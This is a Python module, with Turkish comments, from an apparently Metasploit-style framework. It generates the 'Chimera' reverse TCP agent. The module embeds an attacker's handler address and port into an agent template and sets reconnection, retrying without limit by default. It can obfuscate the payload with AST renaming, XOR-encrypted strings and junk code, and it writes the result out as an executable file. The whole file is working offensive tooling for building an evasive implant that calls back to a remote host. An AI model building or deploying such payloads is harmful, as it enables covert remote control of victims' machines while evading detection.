from core.module import BaseModule
from core.option import Option
from typing import Dict, Any
import os
import sys

# Builder çekirdek kütüphanesini içe aktarmaya çalış
try:
    from build.chimera_builder import build_payload, print_build_report
    _BUILDER_AVAILABLE = True
except ImportError:
    proot = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))
    if proot not in sys.path:
        sys.path.insert(0, proot)
    try:
        from build.chimera_builder import build_payload, print_build_report
        _BUILDER_AVAILABLE = True
    except ImportError:
        _BUILDER_AVAILABLE = False

# Obfuscator kütüphanesini içe aktarmaya çalış
try:
    from build.chimera_obfuscator import obfuscate, print_obfuscation_report
    _OBFUSCATOR_AVAILABLE = True
except ImportError:
    _OBFUSCATOR_AVAILABLE = False


class Payload(BaseModule):
    """
    Chimera Core Agent - Reverse TCP Payload Generator.
    Gelişmiş Chimera ajanını üretir. Sadece Python 3 standart kütüphaneleri kullanır.
    """
    Name = "Chimera Core Agent"
    Description = "Chimera reverse TCP ajanı. Builder + Obfuscation altyapısını destekler."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST":           Option("LHOST",           "127.0.0.1", True,  "Bağlanılacak IP (Handler)."),
            "LPORT":           Option("LPORT",           4444,        True,  "Bağlanılacak Port."),
            "OUTPUT":          Option("OUTPUT",          "",          False, "Payload'ı dosyaya kaydet (örn: /tmp/chimera.py).", completion_dir="."),
            "RECONNECT_DELAY": Option("RECONNECT_DELAY", 5,           False, "Yeniden bağlanma bekleme süresi (sn)."),
            "MAX_RECONNECT":   Option("MAX_RECONNECT",   -1,          False, "Maksimum bağlanma denemesi (-1 = sınırsız)."),
            "STRIP_COMMENTS":  Option("STRIP_COMMENTS",  False,       False, "Yorum satırlarını temizle.", choices=[True, False]),
            "OBFUSCATE":       Option("OBFUSCATE",       False,       False, "AST rename + XOR string şifreleme + junk code uygula.", choices=[True, False]),
        }

    def _to_bool(self, val) -> bool:
        """Option değerini bool'a çevirir."""
        if isinstance(val, bool):
            return val
        return str(val).lower() in ("true", "1", "yes", "evet")

    def generate(self, quiet: bool = True) -> dict:
        """
        Chimera agent kodunu okur, konfigürasyonları gömer ve
        opsiyonel olarak obfuscation uygular.

        Returns:
            dict: {success, code, output_path, error, stats, obfuscation_stats}
        """
        lhost           = self.Options["LHOST"].value
        lport           = self.Options["LPORT"].value
        output          = self.Options["OUTPUT"].value
        reconnect_delay = int(self.Options["RECONNECT_DELAY"].value or 5)
        max_reconnect   = int(self.Options["MAX_RECONNECT"].value or -1)
        strip_comments  = self._to_bool(self.Options["STRIP_COMMENTS"].value)
        obfuscate_flag  = self._to_bool(self.Options["OBFUSCATE"].value)

        agent_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "agent.py"
        )

        if not _BUILDER_AVAILABLE:
            return {
                "success": False,
                "error": "[!] build.chimera_builder yüklenemedi!",
                "code": "", "output_path": None, "stats": {}, "obfuscation_stats": {}
            }

        # --- Aşama 1: Build (placeholder gömme) ---
        result = build_payload(
            lhost=lhost,
            lport=int(lport),
            reconnect_delay=reconnect_delay,
            max_reconnect=max_reconnect,
            output_path=None,           # Obfuscation sonrası yazacağız
            agent_source_path=agent_path,
            strip_comments=strip_comments,
            quiet=quiet,
        )

        result["obfuscation_stats"] = {}

        if not result["success"]:
            return result

        # --- Aşama 2: Obfuscation (opsiyonel) ---
        if obfuscate_flag:
            if not _OBFUSCATOR_AVAILABLE:
                print("[!] UYARI: build.chimera_obfuscator yüklenemedi, obfuscation atlandı.")
            else:
                if not quiet:
                    print("[*] Obfuscation uygulanıyor...")

                obf_result = obfuscate(result["code"])

                if obf_result["success"]:
                    result["code"] = obf_result["code"]
                    result["obfuscation_stats"] = obf_result["stats"]
                    # İstatistikleri güncelle
                    import hashlib
                    final_code = result["code"].encode("utf-8")
                    result["stats"]["final_size"]  = len(final_code)
                    result["stats"]["line_count"]  = result["code"].count("\n") + 1
                    result["stats"]["md5"]         = hashlib.md5(final_code).hexdigest()
                    result["stats"]["sha256"]      = hashlib.sha256(final_code).hexdigest()
                else:
                    print(f"[!] Obfuscation başarısız: {obf_result['error']}")

        # --- Aşama 3: Dosyaya yaz (opsiyonel) ---
        if output:
            if not output.endswith(".py"):
                output += ".py"
            output_dir = os.path.dirname(output)
            if output_dir and not os.path.exists(output_dir):
                os.makedirs(output_dir, exist_ok=True)
            try:
                with open(output, "w", encoding="utf-8") as f:
                    f.write(result["code"])
                if sys.platform != "win32":
                    os.chmod(output, 0o755)
                result["output_path"] = os.path.abspath(output)
            except Exception as e:
                result["error"]   = f"[!] Dosya yazma hatası: {e}"
                result["success"] = False

        return result

    def run(self, options: Dict[str, Any]):
        """Payload oluştur, obfuscate et ve ekrana bas veya dosyaya kaydet."""
        if not _BUILDER_AVAILABLE:
            print("[!] HATA: build/chimera_builder.py bulunamadı.")
            return None

        obfuscate_flag = self._to_bool(self.Options["OBFUSCATE"].value)

        if obfuscate_flag and not _OBFUSCATOR_AVAILABLE:
            print("[!] HATA: build/chimera_obfuscator.py bulunamadı. OBFUSCATE=false yapın veya dosyayı kontrol edin.")
            return None

        result = self.generate(quiet=False)

        if result["success"]:
            # Build raporu
            print_build_report(result)

            # Obfuscation raporu (varsa)
            if obfuscate_flag and result.get("obfuscation_stats") and _OBFUSCATOR_AVAILABLE:
                print_obfuscation_report({
                    "success": True,
                    "stats": result["obfuscation_stats"]
                })

            if result.get("output_path"):
                print(f"[+] Payload kaydedildi: {result['output_path']}")
                return result["output_path"]

            return result["code"]
        else:
            print(result["error"])
            return result["error"]
